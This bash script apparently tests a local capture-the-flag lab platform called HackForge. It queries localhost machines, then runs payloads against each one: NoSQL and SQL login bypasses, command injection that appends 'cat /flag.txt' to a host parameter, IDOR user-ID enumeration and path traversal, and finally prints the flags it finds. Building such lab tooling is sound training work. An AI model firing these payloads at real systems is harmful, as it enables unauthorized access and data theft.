#!/bin/bash

echo "╔══════════════════════════════════════════════════════════╗"
echo "║         HACKFORGE - LIVE FLAG RETRIEVAL TEST             ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""

# ============================================
# STEP 1: Get Machine Information
# ============================================
echo "📋 Step 1: Getting Your Machines..."
echo "════════════════════════════════════════"

MACHINES=$(curl -s http://localhost:8000/api/machines/list)
echo "$MACHINES" | jq '.'

# Extract machine details
MACHINE_1_ID=$(echo "$MACHINES" | jq -r '.machines[0].machine_id')
MACHINE_1_VARIANT=$(echo "$MACHINES" | jq -r '.machines[0].variant')
MACHINE_1_PORT=$(echo "$MACHINES" | jq -r '.machines[0].port')
MACHINE_1_BLUEPRINT=$(echo "$MACHINES" | jq -r '.machines[0].blueprint')

MACHINE_2_ID=$(echo "$MACHINES" | jq -r '.machines[1].machine_id')
MACHINE_2_VARIANT=$(echo "$MACHINES" | jq -r '.machines[1].variant')
MACHINE_2_PORT=$(echo "$MACHINES" | jq -r '.machines[1].port')
MACHINE_2_BLUEPRINT=$(echo "$MACHINES" | jq -r '.machines[1].blueprint')

echo ""
echo "✓ Found 2 Machines:"
echo "  [1] $MACHINE_1_VARIANT (Port: $MACHINE_1_PORT)"
echo "  [2] $MACHINE_2_VARIANT (Port: $MACHINE_2_PORT)"
echo ""

# ============================================
# STEP 2: Check Hints
# ============================================
echo "💡 Step 2: Reading Hints..."
echo "════════════════════════════════════════"
echo ""
echo "▶ Machine 1 Hints ($MACHINE_1_VARIANT):"
echo "─────────────────────────────────────────"
if [ -f "machines/$MACHINE_1_ID/HINTS.md" ]; then
    cat "machines/$MACHINE_1_ID/HINTS.md"
else
    curl -s "http://localhost:8000/api/machine/$MACHINE_1_ID/hints"
fi
echo ""
echo ""

echo "▶ Machine 2 Hints ($MACHINE_2_VARIANT):"
echo "─────────────────────────────────────────"
if [ -f "machines/$MACHINE_2_ID/HINTS.md" ]; then
    cat "machines/$MACHINE_2_ID/HINTS.md"
else
    curl -s "http://localhost:8000/api/machine/$MACHINE_2_ID/hints"
fi
echo ""
echo ""

# ============================================
# STEP 3: Test Machine Access
# ============================================
echo "🌐 Step 3: Testing Machine Access..."
echo "════════════════════════════════════════"
echo ""
echo "▶ Machine 1 ($MACHINE_1_VARIANT) - http://localhost:$MACHINE_1_PORT"
curl -s "http://localhost:$MACHINE_1_PORT" | head -n 30
echo ""
echo ""

# ============================================
# STEP 4: Check Applied Filters
# ============================================
echo "🔍 Step 4: Checking Security Filters..."
echo "════════════════════════════════════════"
echo ""
echo "▶ Machine 1 Filters:"
if [ -f "machines/$MACHINE_1_ID/config.json" ]; then
    cat "machines/$MACHINE_1_ID/config.json" | jq '.filters'
else
    echo "  Config file not found"
fi
echo ""

echo "▶ Machine 2 Filters:"
if [ -f "machines/$MACHINE_2_ID/config.json" ]; then
    cat "machines/$MACHINE_2_ID/config.json" | jq '.filters'
else
    echo "  Config file not found"
fi
echo ""
echo ""

# ============================================
# STEP 5: Exploit Attempts
# ============================================
echo "⚔️  Step 5: Attempting Exploits..."
echo "════════════════════════════════════════"
echo ""

# Function to test NoSQL Injection
test_nosql_injection() {
    local port=$1
    local machine_id=$2
    echo "🔓 Testing NoSQL Injection on Port $port..."
    
    # Test 1: Basic NoSQL bypass
    echo "  [1] Testing: password[\$ne]=1"
    RESULT=$(curl -s -X POST "http://localhost:$port/login" \
        -d "username=admin&password[\$ne]=1")
    echo "$RESULT" | grep -i "flag\|hackforge\|success\|welcome" && echo "    ✓ Potential success!" || echo "    ✗ Failed"
    
    # Test 2: JSON-based bypass
    echo "  [2] Testing: {\"\$gt\":\"\"}"
    RESULT=$(curl -s -X POST "http://localhost:$port/login" \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":{"$gt":""}}')
    echo "$RESULT" | grep -i "flag\|hackforge\|success\|welcome" && echo "    ✓ Potential success!" || echo "    ✗ Failed"
    
    # Test 3: Check if flag is directly accessible
    echo "  [3] Testing: Direct flag access"
    FLAG=$(curl -s "http://localhost:$port/flag.txt")
    if [[ "$FLAG" == HACKFORGE* ]]; then
        echo "    ✓ FLAG FOUND: $FLAG"
        return 0
    fi
    
    # Test 4: Look for flag in response
    echo "  [4] Checking response for flag..."
    echo "$RESULT" | grep -oP "HACKFORGE\{[a-f0-9]{32}\}" | head -1
    
    echo ""
}

# Function to test SQL Injection
test_sql_injection() {
    local port=$1
    echo "🔓 Testing SQL Injection on Port $port..."
    
    # Test 1: Classic OR injection
    echo "  [1] Testing: ' OR '1'='1"
    RESULT=$(curl -s -X POST "http://localhost:$port/login" \
        -d "username=admin' OR '1'='1&password=anything")
    echo "$RESULT" | grep -i "flag\|hackforge\|success\|welcome" && echo "    ✓ Potential success!" || echo "    ✗ Failed"
    
    # Test 2: Comment-based bypass
    echo "  [2] Testing: admin'--"
    RESULT=$(curl -s -X POST "http://localhost:$port/login" \
        -d "username=admin'--&password=")
    echo "$RESULT" | grep -i "flag\|hackforge\|success\|welcome" && echo "    ✓ Potential success!" || echo "    ✗ Failed"
    
    # Look for flag in response
    echo "$RESULT" | grep -oP "HACKFORGE\{[a-f0-9]{32}\}" | head -1
    echo ""
}

# Function to test Command Injection
test_command_injection() {
    local port=$1
    echo "🔓 Testing Command Injection on Port $port..."
    
    # Test different endpoints
    for endpoint in "ping" "exec" "cmd" "run"; do
        echo "  Testing endpoint: /$endpoint"
        
        # Test 1: Semicolon separator
        RESULT=$(curl -s "http://localhost:$port/$endpoint?host=127.0.0.1;cat /flag.txt")
        FLAG=$(echo "$RESULT" | grep -oP "HACKFORGE\{[a-f0-9]{32}\}" | head -1)
        if [ ! -z "$FLAG" ]; then
            echo "    ✓ FLAG FOUND: $FLAG"
            return 0
        fi
        
        # Test 2: Pipe operator
        RESULT=$(curl -s "http://localhost:$port/$endpoint?host=127.0.0.1|cat /flag.txt")
        FLAG=$(echo "$RESULT" | grep -oP "HACKFORGE\{[a-f0-9]{32}\}" | head -1)
        if [ ! -z "$FLAG" ]; then
            echo "    ✓ FLAG FOUND: $FLAG"
            return 0
        fi
    done
    echo ""
}

# Function to test IDOR
test_idor() {
    local port=$1
    echo "🔓 Testing IDOR on Port $port..."
    
    # Test different user IDs
    for id in 0 1 2 999 admin root; do
        echo "  Testing user_id=$id"
        RESULT=$(curl -s "http://localhost:$port/profile?user_id=$id")
        FLAG=$(echo "$RESULT" | grep -oP "HACKFORGE\{[a-f0-9]{32}\}" | head -1)
        if [ ! -z "$FLAG" ]; then
            echo "    ✓ FLAG FOUND: $FLAG"
            return 0
        fi
    done
    echo ""
}

# Function to test Path Traversal
test_path_traversal() {
    local port=$1
    echo "🔓 Testing Path Traversal on Port $port..."
    
    for payload in "../../../flag.txt" "....//....//flag.txt" "/flag.txt" "../../flag.txt"; do
        echo "  Testing: $payload"
        RESULT=$(curl -s "http://localhost:$port/download?file=$payload")
        FLAG=$(echo "$RESULT" | grep -oP "HACKFORGE\{[a-f0-9]{32}\}" | head -1)
        if [ ! -z "$FLAG" ]; then
            echo "    ✓ FLAG FOUND: $FLAG"
            return 0
        fi
    done
    echo ""
}

# Test Machine 1
echo "═══════════════════════════════════════════"
echo "Testing Machine 1: $MACHINE_1_VARIANT"
echo "═══════════════════════════════════════════"
case "$MACHINE_1_VARIANT" in
    *"NoSQL"*)
        test_nosql_injection $MACHINE_1_PORT $MACHINE_1_ID
        ;;
    *"SQL"*)
        test_sql_injection $MACHINE_1_PORT
        ;;
    *"Command"*)
        test_command_injection $MACHINE_1_PORT
        ;;
    *"IDOR"*)
        test_idor $MACHINE_1_PORT
        ;;
    *"Path"*|*"Traversal"*)
        test_path_traversal $MACHINE_1_PORT
        ;;
    *)
        echo "Unknown variant, trying all methods..."
        test_nosql_injection $MACHINE_1_PORT $MACHINE_1_ID
        test_sql_injection $MACHINE_1_PORT
        test_command_injection $MACHINE_1_PORT
        ;;
esac

echo ""
echo "═══════════════════════════════════════════"
echo "Testing Machine 2: $MACHINE_2_VARIANT"
echo "═══════════════════════════════════════════"
case "$MACHINE_2_VARIANT" in
    *"NoSQL"*)
        test_nosql_injection $MACHINE_2_PORT $MACHINE_2_ID
        ;;
    *"SQL"*)
        test_sql_injection $MACHINE_2_PORT
        ;;
    *"Command"*)
        test_command_injection $MACHINE_2_PORT
        ;;
    *"IDOR"*)
        test_idor $MACHINE_2_PORT
        ;;
    *"Path"*|*"Traversal"*)
        test_path_traversal $MACHINE_2_PORT
        ;;
    *)
        echo "Unknown variant, trying all methods..."
        test_nosql_injection $MACHINE_2_PORT $MACHINE_2_ID
        test_sql_injection $MACHINE_2_PORT
        test_command_injection $MACHINE_2_PORT
        ;;
esac

# ============================================
# STEP 6: Direct Flag Check
# ============================================
echo ""
echo "🔍 Step 6: Direct Flag Check..."
echo "════════════════════════════════════════"
echo ""
echo "Checking flag files directly..."
echo ""
if [ -f "machines/$MACHINE_1_ID/flag.txt" ]; then
    FLAG_1=$(cat "machines/$MACHINE_1_ID/flag.txt")
    echo "▶ Machine 1 Flag: $FLAG_1"
else
    echo "▶ Machine 1 Flag file not found locally"
fi

if [ -f "machines/$MACHINE_2_ID/flag.txt" ]; then
    FLAG_2=$(cat "machines/$MACHINE_2_ID/flag.txt")
    echo "▶ Machine 2 Flag: $FLAG_2"
else
    echo "▶ Machine 2 Flag file not found locally"
fi
echo ""

# ============================================
# STEP 7: Flag Submission Template
# ============================================
echo ""
echo "🏁 Step 7: Submit Your Flag"
echo "════════════════════════════════════════"
echo ""
echo "Once you find the flag, submit it with:"
echo ""
echo "curl -X POST http://localhost:8000/api/flag/validate \\"
echo "  -H 'Content-Type: application/json' \\"
echo "  -d '{"
echo "    \"user_id\": \"your_username\","
echo "    \"machine_id\": \"$MACHINE_1_ID\","
echo "    \"flag\": \"HACKFORGE{found_flag_here}\""
echo "  }'"
echo ""

echo "╔══════════════════════════════════════════════════════════╗"
echo "║                  TESTING COMPLETE!                        ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""
echo "📌 Summary:"
echo "  • Machine 1: http://localhost:$MACHINE_1_PORT ($MACHINE_1_VARIANT)"
echo "  • Machine 2: http://localhost:$MACHINE_2_PORT ($MACHINE_2_VARIANT)"
echo ""
echo "🌐 Access machines in browser:"
echo "  • http://localhost:$MACHINE_1_PORT"
echo "  • http://localhost:$MACHINE_2_PORT"
echo ""
echo "💡 Get hints from frontend: http://localhost:3000"
echo ""
